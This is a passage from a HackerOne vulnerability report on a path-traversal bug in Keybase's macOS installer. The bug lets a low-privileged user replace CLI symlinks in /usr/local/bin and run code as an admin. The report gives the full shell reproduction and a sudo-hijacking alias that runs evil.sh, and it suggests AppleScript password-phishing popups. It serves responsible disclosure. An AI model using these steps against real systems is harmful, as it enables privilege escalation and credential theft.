{"id":485407,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODU0MDc=","url":"https://hackerone.com/reports/485407","title":"From nobody to somebody","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-01-24T16:33:15.416Z","submitted_at":"2019-01-24T16:33:15.416Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"u3mur4","url":"/u3mur4","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-24T23:20:20.068Z","bug_reporter_agreed_on_going_public_at":"2020-01-23T07:12:52.130Z","team_member_agreed_on_going_public_at":"2020-01-24T23:20:19.940Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Short description\n\nUsing a bug any user can change the `keybase` and `git-remote-keybase` symlinks in the `/usr/locale/bin` folder. We can exploit this to run arbitrary code as the user.\n\n# Steps to reproduce\n1. In the example I will use the low privileged `nobody` account (could be any other account) and I will target the `u3mur4` admin user.\n```bash\n➜ ~ sudo -u nobody bash\nPassword:\nbash-3.2$ id\nuid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)\nbash-3.2$\n```\n\n2.  Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure with 2 symlinks which are pointing to the original `keybase` and `git-remote-keybase` binaries.\n```bash\nbash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/keybase keybase\nbash-3.2$ ln -s /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase git-remote-keybase\nbash-3.2$ ls -lah .\ntotal 16\ndrwxr-xr-x  4 nobody  wheel   136B Jan 24 03:31 .\ndrwxr-xr-x  3 nobody  wheel   102B Jan 24 03:30 ..\nlrwxr-xr-x  1 nobody  wheel    71B Jan 24 03:31 git-remote-keybase -\u003e /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase\nlrwxr-xr-x  1 nobody  wheel    60B Jan 24 03:31 keybase -\u003e /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\nbash-3.2$\n```\n\u003e The `nobody` user has write permission to `/var/tmp` directory and content of the directory is preserved between reboots. \n\n3. Run the keybase installer command with `--app-path=/Applications/Keybase.app/../../var/tmp/poc` and the `install-cli` flag.\n```bash\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=/Applications/Keybase.app/../../var/tmp/poc --install-cli\n[REMOVED]\n01.24.2019 03:39:54.411 KBCommandLine:38[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\";\n    name = keybase;\n})\n01.24.2019 03:39:54.414 KBCommandLine:40[DEBG] Result: {\n    path = \"/usr/local/bin/keybase\";\n}\n01.24.2019 03:39:54.414 KBCommandLine:47[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\";\n    name = \"git-remote-keybase\";\n})\n01.24.2019 03:39:54.419 KBCommandLine:49[DEBG] Result: {\n    path = \"/usr/local/bin/git-remote-keybase\";\n}\n01.24.2019 03:39:54.419 KBCommandLine:131[INFO] Link resolved to path: /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase \u003c=\u003e /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\n01.24.2019 03:39:54.419 KBInstaller:45[INFO] Install complete\n[REMOVED]\nbash-3.2$\n```\n\n4. Check that in the `/usr/local/bin` folder the `keybase` and `git-remote-keybase` links are changed to our specified links.\n```bash\nbash-3.2$ ls -lah /usr/local/bin/\ntotal 80\ndrwxrwxr-x  12 u3mur4  admin   408B Jan 24 02:44 .\ndrwxr-xr-x  15 root    wheel   510B Jan 16 07:33 ..\nlrwxr-xr-x   1 u3mur4  admin    28B Jan 16 05:32 brew -\u003e /usr/local/Homebrew/bin/brew\n-rwxr-xr-x   1 root    admin   538B Jan 16 06:30 fuzzy_match\nlrwxr-xr-x   1 u3mur4  admin    89B Jan 24 02:44 git-remote-keybase -\u003e /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/git-remote-keybase\nlrwxr-xr-x   1 u3mur4  admin    29B Jan 16 05:44 htop -\u003e ../Cellar/htop/2.2.0/bin/htop\nlrwxr-xr-x   1 u3mur4  admin    78B Jan 24 02:44 keybase -\u003e /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\n-rwxr-xr-x   1 root    admin   526B Jan 16 06:30 pod\n-rwxr-xr-x   1 root    admin   534B Jan 16 06:30 sandbox-pod\n-rwxr-xr-x   1 root    admin   532B Jan 16 06:30 xcodeproj\nlrwxr-xr-x   1 u3mur4  admin    29B Jan 23 22:42 zsh -\u003e ../Cellar/zsh/5.6.2_1/bin/zsh\nlrwxr-xr-x   1 u3mur4  admin    35B Jan 23 22:42 zsh-5.6.2 -\u003e ../Cellar/zsh/5.6.2_1/bin/zsh-5.6.2\n```\n\u003e Notice that the `nobody` account has no permission the change these links directly.\n\n5. Remove our links in the `/var/tmp/poc/Contents/SharedSupport/bin/` folder and create some executable files. In the example I will just simply use the `id` command and I forward the flags to the original binaries.\n```bash\nbash-3.2$ ls\ngit-remote-keybase\tkeybase\nbash-3.2$ rm keybase git-remote-keybase\nbash-3.2$ cat \u003c\u003cEOF \u003e\u003e keybase\n#!/bin/bash\nid \u003e\u003e /tmp/out\n/Applications/Keybase.app/Contents/SharedSupport/bin/keybase \\$@\nEOF\nbash-3.2$ cat \u003c\u003cEOF \u003e\u003e git-remote-keybase\n#!/bin/bash\nid \u003e\u003e /tmp/out\n/Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase \\$@\nEOF\nbash-3.2$ chmod +x keybase git-remote-keybase\n```\n\n6. Wait until the `u3mur4` account using the `git clone keybase://` or the `keybase` command.\n```bash\n➜  ~ id\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\n➜  ~ keybase\nNAME:\n   keybase - Keybase command line client.\n[REMOVED]\n```\nCheck the `/tmp/out` file. \n```bash\nbash-3.2$ cat /tmp/out\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\nbash-3.2$\n```\n\u003e Notice that the `u3mur4` account executed our binary because we could change the symlinks in the `/usr/local/bin` directory. From now on we can access any file and run arbitrary command as the targeted account. Also we can access the `private` keybase folder of the user and other sensitive data.\n\n7. How to become root?\n\nBecause we can run arbitrary code as the targeted user we have multiple ways to achieve root privileges. By using misconfigurations with a little bit of social engineering you can get your victim to escalate you to root without realizing it.\n\n-  By adding this line to the users .bash_profile: `alias sudo='sudo sh -c '\\''evil.sh \u0026 exec \"$@\"'\\'' sh'`. We can change the behavior of what happens when the user runs “sudo”.\n\n- AppleScript is fairly simple, and can be used to phish for passwords for nearly anything.  If you can acquire the password of an administrator user, you can escalate to root. So when the user runs the keybase binary we can create a popup that the 'keybase helper need to update...' and the user have to enter the password.\n\n- This will work up until El Capitan: The sudoers policy caches credentials for 5 minutes, unless overridden in sudoers(5). What this means is that once a user runs sudo, they can run a command with sudo again for up to 5 minutes without having to enter their password again.\n\n- Short version (see source 2): Homebrew changes the permissions on `/usr/local/bin` to the user (or any process running as the user) is able to write files to it and give those files executable permissions. Now if you (or someone else, or some other program) were to place a program called sudo in /usr/local/bin, then every time you typed sudo it would be that program that would be executed, not the real one.\n\n- etc...\n\n[source1 - privilege-escalation-on-os-x-without-exploits](https://www.n00py.io/2016/10/privilege-escalation-on-os-x-without-exploits/)\n\n[source2 - how-homebrew-invites-users-to-get-pwned](https://applehelpwriter.com/2018/03/21/how-homebrew-invites-users-to-get-pwned/)\n\n# Why can we change the symlinks? \n\u003e **the 3th item is the most important**\n\n1. \nIn the [client/osx/Installer/Options.m:125](https://github.com/keybase/client/blob/master/osx/Installer/Options.m#L125) file\n```\nNSString *servicePath = [self.appPath stringByAppendingPathComponent:@\"Contents/SharedSupport/bin\"];\n```\nthe code appends the `Contents/SharedSupport/bin` path to the specified appPath. We specified appPath in step 2 as `/Applications/Keybase.app/../../var/tmp/poc`. After appending the path, the servicePath becomes `/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin` which resolves to `/var/tmp/poc/Contents/SharedSupport/bin`. That is why we created the directory structure specified in step 2.\n\n2. In the [client/osx/KBKit/KBKit/Component/KBCommandLine.m:26](https://github.com/keybase/client/blob/master/osx/KBKit/KBKit/Component/KBCommandLine.m#L26) file\n```\n...\n  if (![self.config isInApplications:self.servicePath]) {\n    completion(KBMakeWarning(@\"Command line install is not supported from this location: %@\", self.servicePath));\n    return;\n  }\n...\n```\nthe code checks that the servicePath start with `/Application`. That is why we specify the `/Application...` appPath with the `../..` components in step 3.\n\n3. In the [client/osx/Helper/KBHelper.m:371](https://github.com/keybase/client/blob/master/osx/Helper/KBHelper.m#L371) file the `install` function will call the [checkAbsolutePath](https://github.com/keybase/client/blob/master/osx/Helper/fs.m#L71-L91) function with `path=/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase` and `prefix=/Applications/Keybase.app` arguments.\n```\n/*\n * check that the path path has the prefix prefix, being wise to\n * whatever attacks people will throw at us, like /a/b/../../.., etc\n */\n+(BOOL)checkAbsolutePath:(NSString *)path hasAbsolutePrefix:(NSString *)prefix {\n    if (!prefix.absolutePath) {\n        return NO;\n    }\n    if (!path.absolutePath) {\n        return NO;\n    }\n    NSArray *a = [path.stringByStandardizingPath componentsSeparatedByString:@\"/\"];\n    NSArray *b = [prefix.stringByStandardizingPath componentsSeparatedByString:@\"/\"];\n    if (a.count \u003c b.count) {\n        return NO;\n    }\n\n    for (int i = 0; i \u003c b.count; i++) {\n        if (![a[i] isEqualToString:b[i]]) {\n            return NO;\n        }\n    }\n    return YES;\n}\n```\nThe `a` (path) array becomes `[\"\", Application, \"Keybase.app\", Contents, SharedSupport, bin, keybase]`. **So the stringByStandardizingPath function will resolves the /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase link** that is why it will start as the b `[\"\", Application, \"Keybase.app\"]` array. The function will return `YES` and the add `addToPath` function will create the link.\n\n4. In the [client/osx/KBKit/KBKit/Component/KBCommandLine.m:125-137](https://github.com/keybase/client/blob/master/osx/KBKit/KBKit/Component/KBCommandLine.m#L125-L137) file\n```\n- (BOOL)linkedToServicePath {\n  NSString *linkDir = @\"/usr/local/bin\";\n  NSString *linkPath = [NSString stringWithFormat:@\"%@/%@\", linkDir, self.config.serviceBinName];\n  NSString *shouldResolveToPath = [NSString stringWithFormat:@\"%@/%@\", self.servicePath, self.config.serviceBinName];\n  if ([NSFileManager.defaultManager fileExistsAtPath:linkDir]) {\n    NSString *resolved = [self resolveLinkPath:linkPath];\n    DDLogInfo(@\"Link resolved to path: %@ \u003c=\u003e %@\", resolved, shouldResolveToPath);\n    if ([resolved isEqualToString:shouldResolveToPath]) {\n      return YES;\n    }\n  }\n  return NO;\n}\n```\nthe code checks that `/usr/local/bin` + `serviceBinName` link resolves to the same place as our specified `servicePath` (appPath + Contents/SharedSupport/bin) + `serviceBinName`. That is why we created two symlink to the original binaries in step 2.\n\n\u003e Notice that we have permission to remove, modify later this link, (in step 4 and 5).\n\n## Impact\n\nUnauthorized access is possible which impacts the confidentially, integrity, and availability of the system.","vulnerability_information_html":"\u003ch1 id=\"short-description\"\u003eShort description\u003c/h1\u003e\n\n\u003cp\u003eUsing a bug any user can change the \u003ccode\u003ekeybase\u003c/code\u003e and \u003ccode\u003egit-remote-keybase\u003c/code\u003e symlinks in the \u003ccode\u003e/usr/locale/bin\u003c/code\u003e folder. We can exploit this to run arbitrary code as the user.\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eIn the example I will use the low privileged \u003ccode\u003enobody\u003c/code\u003e account (could be any other account) and I will target the \u003ccode\u003eu3mur4\u003c/code\u003e admin user.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e➜ ~ \u003cspan class=\"nb\"\u003esudo\u003c/span\u003e \u003cspan class=\"nt\"\u003e-u\u003c/span\u003e nobody bash\nPassword:\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003eid\n\u003c/span\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e4294967294\u003cspan class=\"o\"\u003e(\u003c/span\u003enobody\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e4294967294\u003cspan class=\"o\"\u003e(\u003c/span\u003enobody\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e4294967294\u003cspan class=\"o\"\u003e(\u003c/span\u003enobody\u003cspan class=\"o\"\u003e)\u003c/span\u003e,12\u003cspan class=\"o\"\u003e(\u003c/span\u003eeveryone\u003cspan class=\"o\"\u003e)\u003c/span\u003e,61\u003cspan class=\"o\"\u003e(\u003c/span\u003elocalaccounts\u003cspan class=\"o\"\u003e)\u003c/span\u003e,702\u003cspan class=\"o\"\u003e(\u003c/span\u003e2\u003cspan class=\"o\"\u003e)\u003c/span\u003e,701\u003cspan class=\"o\"\u003e(\u003c/span\u003e1\u003cspan class=\"o\"\u003e)\u003c/span\u003e,100\u003cspan class=\"o\"\u003e(\u003c/span\u003e_lpoperator\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nbash-3.2\u003cspan class=\"err\"\u003e$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreate the \u003ccode\u003e/var/tmp/poc/Contents/SharedSupport/bin\u003c/code\u003e folder structure with 2 symlinks which are pointing to the original \u003ccode\u003ekeybase\u003c/code\u003e and \u003ccode\u003egit-remote-keybase\u003c/code\u003e binaries.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003emkdir\u003c/span\u003e \u003cspan class=\"nt\"\u003e-p\u003c/span\u003e /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e /Applications/Keybase.app/Contents/SharedSupport/bin/keybase keybase\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003eln\u003c/span\u003e \u003cspan class=\"nt\"\u003e-s\u003c/span\u003e /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase git-remote-keybase\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003els\u003c/span\u003e \u003cspan class=\"nt\"\u003e-lah\u003c/span\u003e \u003cspan class=\"nb\"\u003e.\u003c/span\u003e\ntotal 16\ndrwxr-xr-x  4 nobody  wheel   136B Jan 24 03:31 \u003cspan class=\"nb\"\u003e.\u003c/span\u003e\ndrwxr-xr-x  3 nobody  wheel   102B Jan 24 03:30 ..\nlrwxr-xr-x  1 nobody  wheel    71B Jan 24 03:31 git-remote-keybase -\u0026gt; /Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase\nlrwxr-xr-x  1 nobody  wheel    60B Jan 24 03:31 keybase -\u0026gt; /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\nbash-3.2\u003cspan class=\"err\"\u003e$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe \u003ccode\u003enobody\u003c/code\u003e user has write permission to \u003ccode\u003e/var/tmp\u003c/code\u003e directory and content of the directory is preserved between reboots. \u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRun the keybase installer command with \u003ccode\u003e--app-path=/Applications/Keybase.app/../../var/tmp/poc\u003c/code\u003e and the \u003ccode\u003einstall-cli\u003c/code\u003e flag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e/Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase \u003cspan class=\"nt\"\u003e--run-mode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eprod \u003cspan class=\"nt\"\u003e--timeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10 \u003cspan class=\"nt\"\u003e--debug\u003c/span\u003e \u003cspan class=\"nt\"\u003e--app-path\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/Applications/Keybase.app/../../var/tmp/poc \u003cspan class=\"nt\"\u003e--install-cli\u003c/span\u003e\n\u003cspan class=\"o\"\u003e[\u003c/span\u003eREMOVED]\n01.24.2019 03:39:54.411 KBCommandLine:38[DEBG] Helper: addToPath\u003cspan class=\"o\"\u003e({\u003c/span\u003e\nappName \u003cspan class=\"o\"\u003e=\u003c/span\u003e Keybase\u003cspan class=\"p\"\u003e;\u003c/span\u003e\ndirectory \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\nname \u003cspan class=\"o\"\u003e=\u003c/span\u003e keybase\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e})\u003c/span\u003e\n01.24.2019 03:39:54.414 KBCommandLine:40[DEBG] Result: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\npath \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/usr/local/bin/keybase\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n01.24.2019 03:39:54.414 KBCommandLine:47[DEBG] Helper: addToPath\u003cspan class=\"o\"\u003e({\u003c/span\u003e\nappName \u003cspan class=\"o\"\u003e=\u003c/span\u003e Keybase\u003cspan class=\"p\"\u003e;\u003c/span\u003e\ndirectory \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\nname \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;git-remote-keybase\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e})\u003c/span\u003e\n01.24.2019 03:39:54.419 KBCommandLine:49[DEBG] Result: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\npath \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/usr/local/bin/git-remote-keybase\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n01.24.2019 03:39:54.419 KBCommandLine:131[INFO] Link resolved to path: /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase \u0026lt;\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\n01.24.2019 03:39:54.419 KBInstaller:45[INFO] Install \u003cspan class=\"nb\"\u003ecomplete\u003c/span\u003e\n\u003cspan class=\"o\"\u003e[\u003c/span\u003eREMOVED]\nbash-3.2\u003cspan class=\"err\"\u003e$\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCheck that in the \u003ccode\u003e/usr/local/bin\u003c/code\u003e folder the \u003ccode\u003ekeybase\u003c/code\u003e and \u003ccode\u003egit-remote-keybase\u003c/code\u003e links are changed to our specified links.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003els\u003c/span\u003e \u003cspan class=\"nt\"\u003e-lah\u003c/span\u003e /usr/local/bin/\ntotal 80\ndrwxrwxr-x  12 u3mur4  admin   408B Jan 24 02:44 \u003cspan class=\"nb\"\u003e.\u003c/span\u003e\ndrwxr-xr-x  15 root    wheel   510B Jan 16 07:33 ..\nlrwxr-xr-x   1 u3mur4  admin    28B Jan 16 05:32 brew -\u0026gt; /usr/local/Homebrew/bin/brew\n\u003cspan class=\"nt\"\u003e-rwxr-xr-x\u003c/span\u003e   1 root    admin   538B Jan 16 06:30 fuzzy_match\nlrwxr-xr-x   1 u3mur4  admin    89B Jan 24 02:44 git-remote-keybase -\u0026gt; /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/git-remote-keybase\nlrwxr-xr-x   1 u3mur4  admin    29B Jan 16 05:44 htop -\u0026gt; ../Cellar/htop/2.2.0/bin/htop\nlrwxr-xr-x   1 u3mur4  admin    78B Jan 24 02:44 keybase -\u0026gt; /Applications/Keybase.app/../../var/tmp/poc/Contents/SharedSupport/bin/keybase\n\u003cspan class=\"nt\"\u003e-rwxr-xr-x\u003c/span\u003e   1 root    admin   526B Jan 16 06:30 pod\n\u003cspan class=\"nt\"\u003e-rwxr-xr-x\u003c/span\u003e   1 root    admin   534B Jan 16 06:30 sandbox-pod\n\u003cspan class=\"nt\"\u003e-rwxr-xr-x\u003c/span\u003e   1 root    admin   532B Jan 16 06:30 xcodeproj\nlrwxr-xr-x   1 u3mur4  admin    29B Jan 23 22:42 zsh -\u0026gt; ../Cellar/zsh/5.6.2_1/bin/zsh\nlrwxr-xr-x   1 u3mur4  admin    35B Jan 23 22:42 zsh-5.6.2 -\u0026gt; ../Cellar/zsh/5.6.2_1/bin/zsh-5.6.2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNotice that the \u003ccode\u003enobody\u003c/code\u003e account has no permission the change these links directly.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRemove our links in the \u003ccode\u003e/var/tmp/poc/Contents/SharedSupport/bin/\u003c/code\u003e folder and create some executable files. In the example I will just simply use the \u003ccode\u003eid\u003c/code\u003e command and I forward the flags to the original binaries.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003els\n\u003c/span\u003egit-remote-keybase  keybase\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003erm \u003c/span\u003ekeybase git-remote-keybase\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\u003c/span\u003e\u003cspan class=\"sh\"\u003e \u0026gt;\u0026gt; keybase\n#!/bin/bash\nid \u0026gt;\u0026gt; /tmp/out\n/Applications/Keybase.app/Contents/SharedSupport/bin/keybase \u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"sh\"\u003e@\n\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\n\u003c/span\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\u003c/span\u003e\u003cspan class=\"sh\"\u003e \u0026gt;\u0026gt; git-remote-keybase\n#!/bin/bash\nid \u0026gt;\u0026gt; /tmp/out\n/Applications/Keybase.app/Contents/SharedSupport/bin/git-remote-keybase \u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"sh\"\u003e@\n\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\n\u003c/span\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003echmod\u003c/span\u003e +x keybase git-remote-keybase\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWait until the \u003ccode\u003eu3mur4\u003c/code\u003e account using the \u003ccode\u003egit clone keybase://\u003c/code\u003e or the \u003ccode\u003ekeybase\u003c/code\u003e command.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e➜  ~ \u003cspan class=\"nb\"\u003eid\n\u003c/span\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e501\u003cspan class=\"o\"\u003e(\u003c/span\u003eu3mur4\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e20\u003cspan class=\"o\"\u003e(\u003c/span\u003estaff\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e20\u003cspan class=\"o\"\u003e(\u003c/span\u003estaff\u003cspan class=\"o\"\u003e)\u003c/span\u003e,12\u003cspan class=\"o\"\u003e(\u003c/span\u003eeveryone\u003cspan class=\"o\"\u003e)\u003c/span\u003e,61\u003cspan class=\"o\"\u003e(\u003c/span\u003elocalaccounts\u003cspan class=\"o\"\u003e)\u003c/span\u003e,79\u003cspan class=\"o\"\u003e(\u003c/span\u003e_appserverusr\u003cspan class=\"o\"\u003e)\u003c/span\u003e,80\u003cspan class=\"o\"\u003e(\u003c/span\u003eadmin\u003cspan class=\"o\"\u003e)\u003c/span\u003e,81\u003cspan class=\"o\"\u003e(\u003c/span\u003e_appserveradm\u003cspan class=\"o\"\u003e)\u003c/span\u003e,98\u003cspan class=\"o\"\u003e(\u003c/span\u003e_lpadmin\u003cspan class=\"o\"\u003e)\u003c/span\u003e,702\u003cspan class=\"o\"\u003e(\u003c/span\u003e2\u003cspan class=\"o\"\u003e)\u003c/span\u003e,701\u003cspan class=\"o\"\u003e(\u003c/span\u003e1\u003cspan class=\"o\"\u003e)\u003c/span\u003e,33\u003cspan class=\"o\"\u003e(\u003c/span\u003e_appstore\u003cspan class=\"o\"\u003e)\u003c/span\u003e,100\u003cspan class=\"o\"\u003e(\u003c/span\u003e_lpoperator\u003cspan 